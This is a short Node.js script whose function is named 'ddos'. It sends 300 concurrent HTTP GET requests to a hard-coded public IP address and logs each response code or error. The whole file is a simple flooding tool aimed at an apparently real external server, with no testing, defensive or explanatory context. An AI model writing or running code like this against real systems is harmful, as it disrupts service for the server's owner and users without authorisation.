import http from "http";

const url = "http://3.113.103.79/";
const times = 300;

async function ddos(url, times) {
    for (let i = 0; i < times; i++) {
        http.get(url, (res) => {
            console.log(res.statusCode);
        }).on("error", (err) => {
            console.log(err);
        });
    }
}

ddos(url, times);
